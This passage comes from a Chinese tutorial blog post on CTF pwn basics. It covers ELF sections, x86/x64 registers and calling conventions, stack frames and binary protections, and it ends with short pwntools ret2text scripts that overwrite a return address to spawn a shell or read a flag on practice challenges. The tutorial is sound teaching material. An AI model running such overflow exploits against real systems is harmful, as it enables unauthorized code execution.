+<li><strong>例子</strong>：你程序调用 <code>puts</code>，<code>puts</code> 会出现在 <code>.dynsym</code>。</li>
+</ul>
+<hr>
+<h4 id="got-got-plt"><a href="#got-got-plt" class="headerlink" title=".got &#x2F; .got.plt"></a><code>.got</code> &#x2F; <code>.got.plt</code></h4><ul>
+<li><strong>放什么</strong>：<strong>全局偏移表（GOT）</strong>，本质是一张“指针数组”。<ul>
+<li><code>.got</code>：给<strong>全局变量地址、函数地址等</strong>做间接引用。</li>
+<li><code>.got.plt</code>：更偏向配合 <code>.plt</code> 做<strong>延迟绑定</strong>（lazy binding）的函数地址槽。</li>
+</ul>
+</li>
+<li><strong>特点</strong><ul>
+<li>在文件里有初始值（通常指向解析代码或 0）</li>
+<li><strong>运行时可写</strong>，动态链接器会把真实地址写入这里</li>
+</ul>
+</li>
+<li><strong>例子</strong>：<code>puts@GOT</code> 这个槽，运行时会被填成 libc 中 puts 的真实地址。</li>
+</ul>
+<hr>
+<h4 id="plt"><a href="#plt" class="headerlink" title=".plt"></a><code>.plt</code></h4><ul>
+<li><strong>放什么</strong>：<strong>过程链接表（PLT）</strong>，是一段“跳板代码”。</li>
+<li><strong>作用</strong>：当你 <code>call puts</code> 时：<ol>
+<li>先跳到 <code>puts@plt</code></li>
+<li><code>puts@plt</code> 去 <code>.got.plt</code> 查真实地址</li>
+<li>若没解析过就触发动态解析，解析后再跳</li>
+</ol>
+</li>
+<li><strong>特点</strong>：位于代码区，可执行，但通常不含真实函数逻辑。</li>
+<li><strong>直观理解</strong>：<code>.plt</code> 是“中转站”；<code>.got.plt</code> 是“电话簿”。</li>
+</ul>
+<hr>
+<h4 id="rela-rel"><a href="#rela-rel" class="headerlink" title=".rela.* &#x2F; .rel.*"></a><code>.rela.*</code> &#x2F; <code>.rel.*</code></h4><ul>
+<li><strong>放什么</strong>：<strong>重定位条目（relocation entries）</strong>。</li>
+<li><strong>作用</strong>：告诉链接器&#x2F;动态链接器：<ul>
+<li><strong>要修补的位置在哪</strong>（某段某偏移）</li>
+<li><strong>用哪个符号修补</strong></li>
+<li><strong>修补类型</strong>（填绝对地址？相对偏移？加上附加常量？）</li>
+</ul>
+</li>
+<li><strong><code>.rel</code> vs <code>.rela</code></strong><ul>
+<li><code>.rel</code>：不显式保存 addend（附加常量），addend 藏在原位置里</li>
+<li><code>.rela</code>：显式保存 addend（x86-64 常用 <code>.rela</code>）</li>
+</ul>
+</li>
+<li><strong>什么时候用</strong><ul>
+<li>静态链接：链接器消耗大部分 <code>.rela.text/.rela.data</code></li>
+<li>动态链接：<code>.rela.plt</code>、<code>.rela.dyn</code> 留给运行时修补 GOT&#x2F;PLT</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h4 id="init-array-fini-array"><a href="#init-array-fini-array" class="headerlink" title=".init_array &#x2F; .fini_array"></a><code>.init_array</code> &#x2F; <code>.fini_array</code></h4><ul>
+<li><strong>放什么</strong><ul>
+<li><code>.init_array</code>：一串函数指针，<strong>程序启动时调用</strong>（构造）。</li>
+<li><code>.fini_array</code>：一串函数指针，<strong>程序退出时调用</strong>（析构）。</li>
+</ul>
+</li>
+<li><strong>来源</strong><ul>
+<li>C++ 全局对象构造&#x2F;析构</li>
+<li><code>__attribute__((constructor))</code> &#x2F; <code>__attribute__((destructor))</code></li>
+</ul>
+</li>
+<li><strong>执行顺序</strong><ul>
+<li>入口 <code>_start</code> → libc 初始化 → 依次调用 <code>.init_array</code> → <code>main</code></li>
+<li><code>exit</code> → 依次调用 <code>.fini_array</code></li>
+</ul>
+</li>
+</ul>
+<hr>
+<h4 id="小结（把它们按用途分组）"><a href="#小结（把它们按用途分组）" class="headerlink" title="小结（把它们按用途分组）"></a>小结（把它们按用途分组）</h4><ul>
+<li><strong>程序内容</strong><ul>
+<li><code>.text</code> 代码</li>
+<li><code>.rodata</code> 只读常量</li>
+<li><code>.data/.bss</code> 可写全局数据</li>
+</ul>
+</li>
+<li><strong>链接&#x2F;调试</strong><ul>
+<li><code>.symtab/.strtab</code></li>
+</ul>
+</li>
+<li><strong>动态链接运行时</strong><ul>
+<li><code>.dynsym/.dynstr</code></li>
+<li><code>.plt/.got/.got.plt</code></li>
+<li><code>.rela/.rel</code></li>
+</ul>
+</li>
+<li><strong>程序生命周期钩子</strong><ul>
+<li><code>.init_array/.fini_array</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="ghost-汇编"><a href="#ghost-汇编" class="headerlink" title=":ghost:汇编"></a>:ghost:汇编</h3><p>寄存器和栈是 CPU 执行许多操作时最直接、最关键的工具</p>
+<p>寄存器是CPU内部的小型高速存储单元，用于临时存储指令执行时的数据、地址、标志等。</p>
+<p>要求不高</p>
+<p><img   src="/image-20250711172325495.png"  alt="image-20250711172325495"></p>
+<p><strong>64</strong></p>
+<ul>
+<li><code>RIP</code> — 指令指针（程序当前执行到哪儿）。</li>
+<li><code>RSP</code> — 栈指针（栈顶地址）。</li>
+<li><code>RBP</code> — 帧指针（传统上指向栈帧基底）。</li>
+<li><code>RAX</code> — 返回值 &amp; syscall 编号（syscall 用）。</li>
+<li><code>RDI, RSI, RDX, RCX, R8, R9</code> — <strong>函数&#x2F;系统调用参数</strong>（顺序很重要：</li>
+<li>函数调用时参数顺序为 <code>RDI, RSI, RDX, RCX, R8, R9</code>；(前6个参数放在寄存器中，之后放在栈上)</li>
+<li>syscall 参数顺序为 <code>RDI, RSI, RDX, R10, R8, R9</code>）。</li>
+<li><code>RBX, R12-R15</code> — callee-saved（被调用者需保存）。</li>
+<li><code>RAX, R10, R11, RDI, RSI, RDX, RCX, R8, R9</code> — caller-saved（调用者必须自己处理其值如果需要保留）。</li>
+</ul>
+<p>记住两条最重要的习语：</p>
+<ul>
+<li>“函数参数在 <code>RDI, RSI, RDX, RCX, R8, R9</code>。”</li>
+<li>“syscall 号在 <code>RAX</code>，返回值也在 <code>RAX</code>。</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>场景</th>
+<th>参数顺序</th>
+<th>被覆盖寄存器</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>函数调用</strong></td>
+<td>RDI → RSI → RDX → RCX → R8 → R9</td>
+<td>无自动覆盖</td>
+</tr>
+<tr>
+<td><strong>系统调用</strong></td>
+<td>RDI → RSI → RDX → R10 → R8 → R9</td>
+<td>RCX 和 R11 被 syscall 自动保存</td>
+</tr>
+</tbody></table>
+<p><strong>32</strong></p>
+<p>参数放在栈上</p>
+<p><code>EIP</code> — 指令指针（下一条要执行的地址，等同于 x86_64 的 <code>RIP</code>）。</p>
+<p><code>ESP</code> — 栈指针（当前栈顶，等同于 <code>RSP</code>）。</p>
+<p><code>EBP</code> — 帧指针（传统上指向栈帧基底，相当于 <code>RBP</code>）。</p>
+<p><code>EAX</code> — 返回值 &amp; syscall 编号（32-bit 下 syscall 号放 <code>EAX</code>，返回值也放 <code>EAX</code>）。</p>
+<p><code>EDI, ESI, EDX, ECX, EBX</code> — 通用寄存器（在不同约定下分配参数或保存临时值）。</p>
+<p><code>EBX, ESI, EDI, EBP</code> — callee-saved（被调用者应保持这些寄存器的值）。</p>
+<p><code>EAX, ECX, EDX</code> — caller-saved（调用者在需要保留时须先保存）。</p>
+<table>
+<thead>
+<tr>
+<th>场景</th>
+<th>参数传递方式</th>
+<th>参数顺序（第1→第6）</th>
+<th>syscall&#x2F;syscall号 &amp; 返回</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>函数调用（常见 C ABI：cdecl&#x2F;stdcall）</strong></td>
+<td><strong>压栈</strong>（从右到左 push）</td>
+<td>在栈上，调用时布局为 <code>argN ... arg2 arg1</code>（传入时最后一个先 push，函数通过 <code>[esp + offset]</code> 读取）</td>
+<td>返回值在 <code>EAX</code></td>
+</tr>
+<tr>
+<td><strong>系统调用（int 0x80）</strong></td>
+<td><strong>寄存器</strong>（直接放寄存器）</td>
+<td><code>EBX</code> → <code>ECX</code> → <code>EDX</code> → <code>ESI</code> → <code>EDI</code> → <code>EBP</code>（对应第1→第6）</td>
+<td>syscall 号放 <code>EAX</code>，返回值在 <code>EAX</code></td>
+</tr>
+</tbody></table>
+<p>一、数据操作类（最基础的）</p>
+<p><img   src="/image-20250711171334911.png"  alt="img"></p>
+<table>
+<thead>
+<tr>
+<th>指令</th>
+<th>含义</th>
+<th>pwn 中常见用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>mov dst, src</code></td>
+<td>拷贝数据（寄存器&#x2F;内存&#x2F;立即数）</td>
+<td>改变量、保存返回地址、传参</td>
+</tr>
+<tr>
+<td><code>lea dst, [expr]</code></td>
+<td>计算地址放入寄存器</td>
+<td>拿变量地址、计算偏移</td>
+</tr>
+<tr>
+<td><code>push src</code></td>
+<td>把值压栈 (<code>rsp -= 8</code>)</td>
+<td>函数调用时保存现场 &#x2F; 手动构造栈</td>
+</tr>
+<tr>
+<td><code>pop dst</code></td>
+<td>从栈顶弹出值 (<code>rsp += 8</code>)</td>
+<td>函数返回 &#x2F; ROP gadget 常用</td>
+</tr>
+<tr>
+<td><code>xchg rax, rbx</code></td>
+<td>交换寄存器</td>
+<td>常见 gadget：<code>xchg eax, esp</code> (pivot stack)</td>
+</tr>
+<tr>
+<td><code>movzx</code> &#x2F; <code>movsx</code></td>
+<td>零&#x2F;符号扩展</td>
+<td>处理 byte → int 之类的类型扩展</td>
+</tr>
+</tbody></table>
+<p><code>[...]</code> 表示 “把方括号里算出的值当作内存地址去访问（读或写）</p>
+<p><code>lea</code> 用来 计算地址表达式的值，并把这个“地址值”放进寄存器。它不会访问内存</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">内存[0x1010] = 0xDEADBEEF</span><br><span class="line">rbx = 0x1000</span><br><span class="line">rcx = 2</span><br><span class="line">那么</span><br><span class="line">mov rax, [rbx] &gt;去地址 0x1000 访问内存，把里面的值 0xDEADBEEF 读出来。即：rax = 0xDEADBEEF</span><br><span class="line">lea rax, [rbx + rcx*4 + 8] &gt; rax = 0x1000 + 2*4 + 8 = 0x1010</span><br><span class="line">CPU 并不会去访问内存地址 0x1010 的内容，只是把 这个地址数值 存进 rax。</span><br></pre></td></tr></table></figure>
+
+
+
+<p>⚙️ 二、算术运算类</p>
+<table>
+<thead>
+<tr>
+<th>指令</th>
+<th>含义</th>
+<th>pwn 实战中的常见点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>add dst, src</code></td>
+<td>相加</td>
+<td>指针运算、偏移调整</td>
+</tr>
+<tr>
+<td><code>sub dst, src</code></td>
+<td>相减</td>
+<td>栈空间分配 (<code>sub rsp, 0x20</code>)</td>
+</tr>
+<tr>
+<td><code>inc reg</code> &#x2F; <code>dec reg</code></td>
+<td>加1&#x2F;减1</td>
+<td>常见循环 &#x2F; 指针偏移</td>
+</tr>
+<tr>
+<td><code>imul</code> &#x2F; <code>mul</code></td>
+<td>乘法（有符号&#x2F;无符号）</td>
+<td>不太常见，出现在运算逻辑</td>
+</tr>
+<tr>
+<td><code>div</code> &#x2F; <code>idiv</code></td>
+<td>除法（注意用 rdx:rax）</td>
+<td>算数逻辑题、算法题中</td>
+</tr>
+<tr>
+<td><code>neg reg</code></td>
+<td>取负数</td>
+<td>算术 gadget 时有用</td>
+</tr>
+</tbody></table>
+<p>💡 三、逻辑 &#x2F; 位操作类（pwn 中非常常见）</p>
+<table>
+<thead>
+<tr>
+<th>指令</th>
+<th>含义</th>
+<th>pwn 用法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>xor reg, reg</code></td>
+<td>异或（常用于清零）</td>
+<td><code>xor rax, rax</code> → <code>rax = 0</code>（经典 gadget）</td>
+</tr>
+<tr>
+<td><code>and reg, imm</code></td>
+<td>位与（掩码）</td>
+<td>清除特定位</td>
+</tr>
+<tr>
+<td><code>or reg, imm</code></td>
+<td>位或</td>
+<td>设置特定位</td>
+</tr>
+<tr>
+<td><code>not reg</code></td>
+<td>取反</td>
+<td>混淆或 gadget 构造</td>
+</tr>
+<tr>
+<td><code>shl</code>, <code>shr</code>, <code>sar</code></td>
+<td>移位（逻辑&#x2F;算术）</td>
+<td>位运算、乘除 2 的幂次</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>指令</th>
+<th>操作</th>
+<th>结果</th>
+<th>常见用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>xor</code></td>
+<td>按位异或</td>
+<td>不同为 1</td>
+<td>清零、加密、gadget</td>
+</tr>
+<tr>
+<td><code>and</code></td>
+<td>按位与</td>
+<td>都为 1 才为 1</td>
+<td>清除位（掩码）</td>
+</tr>
+<tr>
+<td><code>or</code></td>
+<td>按位或</td>
+<td>只要有 1 就为 1</td>
+<td>设置位</td>
+</tr>
+<tr>
+<td><code>not</code></td>
+<td>按位取反</td>
+<td>0→1, 1→0</td>
+<td>取补、混淆</td>
+</tr>
+<tr>
+<td><code>shl</code></td>
+<td>左移</td>
+<td>×2ⁿ</td>
+<td>乘法、移位</td>
+</tr>
+<tr>
+<td><code>shr</code></td>
+<td>逻辑右移</td>
+<td>÷2ⁿ (无符号)</td>
+<td>除法、位处理</td>
+</tr>
+<tr>
+<td><code>sar</code></td>
+<td>算术右移</td>
+<td>÷2ⁿ (保符号)</td>
+<td>有符号除法</td>
+</tr>
+</tbody></table>
+<p>🔍 四、比较 &#x2F; 分支控制类</p>
+<table>
+<thead>
+<tr>
+<th>指令</th>
+<th>含义</th>
+<th>pwn 场景</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>cmp a, b</code></td>
+<td>计算 a - b，只影响标志位，不保存结果</td>
+<td>条件跳转判断</td>
+</tr>
+<tr>
+<td><code>test a, b</code></td>
+<td>按位与，只设标志位</td>
+<td>检查为零或特定位</td>
+</tr>
+<tr>
+<td><code>je / jz</code></td>
+<td>如果相等（ZF&#x3D;1）跳转</td>
+<td>if (a &#x3D;&#x3D; b)</td>
+</tr>
+<tr>
+<td><code>jne / jnz</code></td>
+<td>不相等跳转</td>
+<td>if (a !&#x3D; b)</td>
+</tr>
+<tr>
+<td><code>ja / jb / jg / jl</code></td>
+<td>无符号 &#x2F; 有符号大于小于跳转</td>
+<td>if (a &lt; b)</td>
+</tr>
+<tr>
+<td><code>jmp label</code></td>
+<td>无条件跳转</td>
+<td>跳转、跳表、shellcode</td>
+</tr>
+<tr>
+<td><code>call func</code></td>
+<td>调用函数（压返回地址）</td>
+<td>函数调用、溢出时覆盖返回地址</td>
+</tr>
+<tr>
+<td><code>ret</code></td>
+<td>从函数返回（弹出返回地址跳转）</td>
+<td>栈溢出、ROP gadget 的关键</td>
+</tr>
+</tbody></table>
+<p>🧱 五、栈与函数调用（pwn 最常分析的区域）</p>
+<table>
+<thead>
+<tr>
+<th>指令</th>
+<th>功能</th>
+<th>用处</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>push rbp</code> &#x2F; <code>mov rbp, rsp</code></td>
+<td>建立栈帧</td>
+<td>函数入口（prologue）</td>
+</tr>
+<tr>
+<td><code>leave</code></td>
+<td>等价于 <code>mov rsp, rbp; pop rbp</code></td>
+<td>函数退出（epilogue）</td>
+</tr>
+<tr>
+<td><code>ret</code></td>
+<td>从栈顶取返回地址跳转</td>
+<td><strong>溢出劫持控制流的关键点</strong></td>
+</tr>
+<tr>
+<td><code>pop rdi</code> &#x2F; <code>pop rsi</code> &#x2F; <code>pop rdx</code> &#x2F; <code>pop rax</code></td>
+<td>从栈加载参数</td>
+<td>ROP 链构造必备</td>
+</tr>
+<tr>
+<td><code>syscall</code></td>
+<td>执行系统调用</td>
+<td>直接调用内核（shellcode）</td>
+</tr>
+<tr>
+<td><code>int 0x80</code></td>
+<td>旧版 32-bit syscall 方式</td>
+<td>仅用于 32 位靶机</td>
+</tr>
+</tbody></table>
+<p>🧨 六、系统调用类（shellcode &#x2F; ROP 核心）</p>
+<table>
+<thead>
+<tr>
+<th>指令</th>
+<th>功能</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>syscall</code></td>
+<td>触发系统调用（64 位）</td>
+<td>根据 <code>rax</code> 的 syscall 号执行系统调用</td>
+</tr>
+<tr>
+<td><code>int 0x80</code></td>
+<td>触发系统调用（32 位）</td>
+<td>较老架构使用</td>
+</tr>
+<tr>
+<td><code>hlt</code></td>
+<td>挂起 CPU（少见）</td>
+<td>调试或陷阱</td>
+</tr>
+<tr>
+<td><code>nop</code></td>
+<td>空操作</td>
+<td>对齐、NOP-sled（shellcode）</td>
+</tr>
+</tbody></table>
+<hr>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// 编译选项会关掉优化和内联，这里再显式禁止内联</span><br><span class="line">__attribute__((noinline))</span><br><span class="line">int add(int a, int b) &#123;</span><br><span class="line">    int c = a + b;      // 这里下断点最适合看局部变量和栈</span><br><span class="line">    return c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__attribute__((noinline))</span><br><span class="line">int main(void) &#123;</span><br><span class="line">    int x = 2;</span><br><span class="line">    int y = 3;</span><br><span class="line">    int z = add(x, y);  // 观察：32位下参数会以 push 压栈传给 add</span><br><span class="line">    return z;           // 使程序退出码 = 5，便于验证</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>gcc -m32 -g -O0 -fno-omit-frame-pointer -fno-inline -no-pie -fno-pie add.c -o add</p>
+</blockquote>
+<h3 id="ghost-栈结构"><a href="#ghost-栈结构" class="headerlink" title=":ghost:栈结构"></a>:ghost:栈结构</h3><blockquote>
+<h2 id="先说“栈”和“堆”是啥"><a href="#先说“栈”和“堆”是啥" class="headerlink" title="先说“栈”和“堆”是啥"></a>先说“栈”和“堆”是啥</h2><ul>
+<li><strong>栈（stack）</strong>：放函数调用相关的临时东西<br>例如：局部变量、返回地址、保存的寄存器等。<br>特点：<strong>自动管理</strong>，函数进来分配，函数退出释放。</li>
+<li><strong>堆（heap）</strong>：放你运行时“手动申请”的内存<br>例如：<code>malloc/new</code> 出来的对象。<br>特点：<strong>手动&#x2F;库管理</strong>，你申请多少就给多少，用完要释放（<code>free/delete</code>）。</li>
+</ul>
+</blockquote>
+<p><img   src="/image-20250711171510506.png"  alt="img"></p>
+<h4 id="入栈"><a href="#入栈" class="headerlink" title="入栈"></a>入栈</h4><p>add(2，3)</p>
+<p>（1）<strong>压入参数</strong></p>
+<p>根据调用约定，<code>main</code>函数作为调用者，首先需要将<code>add</code>函数的两个参数a,b压入栈中。</p>
+<p>注意压入参数的顺序，首先压入b，接着压入a，也就是说，压入参数的顺序是<strong>从右到左</strong>。</p>
+<p>（2）<strong>返回地址压栈</strong></p>
+<p><code>call target</code> 的行为等价于两步：</p>
+<ol>
+<li><code>push rip_next</code>（把<strong>下一条指令的地址</strong>压到栈上）</li>
+<li><code>jmp target</code>（把 RIP 跳到被调用函数）</li>
+</ol>
+<p>返回地址压栈。main函数为了让<code>add</code>函数调用后正常返回，需要将当前指令（call指令）的下一条指令的地址压入栈中</p>
+<p>call指令包含两个步骤：main函数的下一条指令压栈；控制eip为<code>func</code>函数的第一条语句，eip存储着CPU将要执行的指令的地址</p>
+<p>（3）<strong>add函数运行</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add`函数需要自己的内部运作空间。可以使用以下指令序列开辟空间：`push ebp` `mov ebp,esp` `sub esp,28h</span><br></pre></td></tr></table></figure>
+
+<p>这个28h就是开辟的存储<code>func</code>函数的相关内存的空间</p>
+<p><code>mov ebp,esp</code>看似没有变化，但EBP 从“保存调用者基址”变为“当前函数的栈帧基址”。把当前栈顶指针（<code>esp</code>）的值复制到 <code>ebp</code></p>
+<p>（4）<strong>func函数的局部变量和参数</strong></p>
+<p><code>func</code>函数有自己内部的运作空间，即func_ebp到func_esp</p>
+<p>局部变量在编译之后会被表示为与ebp 不同的距离</p>
+<p><img   src="/pwn%E5%85%A5%E9%97%A8/image-20250711171421699.png"  alt="img"></p>
+<p>v2被表示为ebp -18h，v3被表示为ebp -10h。</p>
+<p>注意，这里的v2, v3和v4都是局部变量。参数的读取方式例子:第一个参数是ebp+8，第二个参数是ebp+12</p>
+<p>因为调用约定，肯定有main_next和main_ebp在ebp的上方，故偏移是固定的，在返回地址main_next上面</p>
+<p>然后，<code>func</code>函数返回。两个步骤：清除栈空间，返回到之前执行的指令（main_next）处。</p>
+<h4 id="出栈"><a href="#出栈" class="headerlink" title="出栈"></a>出栈</h4><p>这里add函数进行了简化</p>
+<p>(5)<strong>add函数返回步骤1:清除栈空间</strong></p>
+<p>每个函数清除栈空间时可以使用一条公用指令leave。</p>
+<p>leave包含两个步骤：</p>
+<p>①<code>mov esp,ebp</code>将栈顶设置为栈基，即将func_ebp到func_esp的内容全部出栈；</p>
+<p>②<code>pop ebp</code> 将main_ebp的内容重新弹回ebp，使main函数的栈基址得到恢复</p>
+<p>(6)<strong>func函数返回步骤2：返回之前执行的指令（main_next）处</strong></p>
+<p>每个函数返回时可以使用一条公用指令ret。ret包含一个步骤：将栈顶弹出到eip寄存器（即下一条指令的位置），达到恢复main函数执行顺序的目的。</p>
+<p>到这里，main函数的栈基址和下一条指令都得到了恢复，也就完成了整个add函数的调用。</p>
+<h2 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h2><h3 id="题目概述"><a href="#题目概述" class="headerlink" title="题目概述"></a>题目概述</h3><p>在常规的CTF比赛中，通常会给一个预置漏洞elf文件，该二进制文件会同时在远程目标主机上运行，并绑定一个端口。</p>
+<p>连接某个端口不会“魔法般地跑起文件”，而是：有一个程序事先在那台机器上运行并把那个端口“占着”（绑定&#x2F;监听）——当你连上去，操作系统把这条连接交给那个程序，程序就开始跟你交互。</p>
+<ul>
+<li>服务器 &#x3D; 餐厅</li>
+<li>端口 &#x3D; 餐厅的门号（比如门 1337）</li>
+<li>监听程序 &#x3D; 开门的服务员（一直站在门口）</li>
+<li>你连上端口 &#x3D; 你走到门口按门铃（发起连接）</li>
+<li>结果：服务员听到有人来，就开始接待（把连接交给内部进程处理）</li>
+</ul>
+<p>你看到的是“按门铃 → 有人来接待”，而不是“按门铃 → 门口才突然出现服务员”。</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://buuoj.cn/challenges#test_your_nc" >nc—try<i class="fas fa-external-link-alt"></i></a></p>
+<h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><blockquote>
+<p>需要工具</p>
+<p>IDA Pro</p>
+<p>虚拟机：</p>
+<p>pwntools<br>pwndbg<br>checksec<br>ROPgadget<br>one gadget<br>LibcSearcher<br>main arena offset</p>
+</blockquote>
+<p>虚拟机</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://ubuntu.com/download/desktop" >镜像文件<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/yier___/article/details/135133662" >vmware配置<i class="fas fa-external-link-alt"></i></a></p>
+<p><strong>改变量主机名</strong></p>
+<p><img   src="/pwn%E5%85%A5%E9%97%A8/image-20251017170048394.png"  alt="image-20251017170048394"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">改主机名</span><br><span class="line">sudo hostnamectl set-hostname 主机名</span><br><span class="line">sudo nano /etc/hosts</span><br><span class="line">#找到127.0.1.1   原始名字 改为127.0.1.1   新名字</span><br><span class="line">#按 Ctrl + O（保存）</span><br><span class="line">#按 Enter（确认）</span><br><span class="line">#按 Ctrl + X（退出）</span><br><span class="line">exec bash</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">改用户名（推荐创建一个新用户）</span><br><span class="line">sudo adduser yxhueimie</span><br><span class="line">sudo usermod -aG sudo pop#给sudo权限</span><br><span class="line">su - pop#切换用户</span><br></pre></td></tr></table></figure>
+
+<h3 id="保护机制"><a href="#保护机制" class="headerlink" title="保护机制"></a>保护机制</h3><p><img   src="/pwn%E5%85%A5%E9%97%A8/image-20251016165430587.png"  alt="image-20251016165430587"></p>
+<p><code>Arch:amd64-64-little</code>：</p>
+<p>amd64即x86_64(CPU架构)</p>
+<p>64即字长为64，返回地址在栈中占 8字节，32位是4字节</p>
+<p>little表示小端序，如果是big则表示大端序。以数字0x12345678为例，小端序存储的是\x78\x56\x34\x12，大端序存储的是\x12\x34\x56\x78</p>
+<p><code>RELRO：Partial RELRO</code>:</p>
+<p>它是一种 <strong>ELF 链接时生成的安全机制</strong>，目的是防止 <strong>GOT（全局偏移表，Global Offset Table）</strong> 被修改。</p>
+<p>简单说：</p>
+<blockquote>
+<p>RELRO 把一部分关键的内存区域（特别是 GOT 表）在程序加载完重定位后改成<strong>只读</strong>，防止攻击者利用写入 GOT 来控制程序流。</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>段&#x2F;表</th>
+<th>正常作用</th>
+<th>为什么能写</th>
+<th>RELRO保护后的变化</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>.got.plt</strong></td>
+<td>存储动态链接函数的真实地址（lazy binding后）</td>
+<td>lazy binding 需要写入真实地址</td>
+<td><strong>NO RELRO</strong> 时可写，<strong>PARTIAL RELRO</strong> 也可写，<strong>FULL RELRO</strong> 时不可写</td>
+</tr>
+<tr>
+<td><strong>.init_array</strong></td>
+<td>程序启动时调用的函数数组</td>
+<td>存函数指针</td>
+<td><strong>NO RELRO</strong> 时可写，<strong>PARTIAL&#x2F;FULL</strong> 时不可写</td>
+</tr>
+<tr>
+<td><strong>.fini_array</strong></td>
+<td>程序退出时调用的函数数组</td>
+<td>存函数指针</td>
+<td><strong>NO RELRO</strong> 时可写，<strong>PARTIAL&#x2F;FULL</strong> 时不可写</td>
+</tr>
+</tbody></table>
+<p><code>Stack:    Canary found</code></p>
+<p>栈保护，一般是在rbp地址之前放置一个数字，在返回时进行校验，以防止栈溢出</p>
+<p><code>NX：NX enabled</code>:</p>
+<p>如果开启了NX保护机制，那么w权限和x权限就是互斥的,即不存在既拥有写权限又拥有执行权限的段。这个保护机制是用来防止shellcode植入的。在gdb调试中，可以通过vmmap命令来查看每个段的权限。</p>
+<p><code>PIE:      PIE enabled</code></p>
+<p>使程序可以被加载到任意内存地址运行</p>
+<p>有 <strong>PIE</strong> → 程序的 <code>.text</code>、<code>.data</code> 等段在每次运行时会被加载到不同的基址。</p>
+<p>没有 <strong>PIE</strong> → 程序的代码段基址固定，比如永远是 <code>0x400000</code>。</p>
+<p><img   src="/pwn%E5%85%A5%E9%97%A8/image-20251016170030401.png"  alt="image-20251016170030401"></p>
+<p><img   src="/pwn%E5%85%A5%E9%97%A8/image-20251016170049819.png"  alt="image-20251016170049819"></p>
+<h2 id="题型"><a href="#题型" class="headerlink" title="题型"></a>题型</h2><h3 id="ret2text-覆盖返回地址"><a href="#ret2text-覆盖返回地址" class="headerlink" title="ret2text(覆盖返回地址)"></a>ret2text(覆盖返回地址)</h3><p><a class="link"   target="_blank" rel="noopener" href="https://buuoj.cn/challenges#rip" >题目<i class="fas fa-external-link-alt"></i></a>system(“&#x2F;bin&#x2F;sh”)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#p=remote(&quot;node5.buuoj.cn&quot;,27287)</span><br><span class="line">p=process(&quot;./pwn1&quot;)</span><br><span class="line">pay=b&quot;a&quot;*(0xf+8)+p64(0x40118a)</span><br><span class="line">p.send(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>CPU &#x2F; 函数调用 &#x2F;远端进程都读取字节，不识别 Python 的整数类型。<code>p64(0x400611)</code> 产生 <code>b&#39;\x11\x06\x40\x00\x00\x00\x00\x00&#39;</code>，这是 64 位小端表示，直接放到返回地址位置进栈后，CPU 按字节解释为地址。</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://buuoj.cn/challenges#warmup_csaw_2016" >题目<i class="fas fa-external-link-alt"></i></a>system(“cat flag.txt”)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=process(&quot;./111&quot;)</span><br><span class="line">#p=remote(&quot;node5.buuoj.cn&quot;,25017)</span><br><span class="line"></span><br><span class="line"># p.recvuntil(b&quot;0x&quot;)</span><br><span class="line"># tar=int(p.recv(6),16)</span><br><span class="line"># #recv(6) 是按字节数读 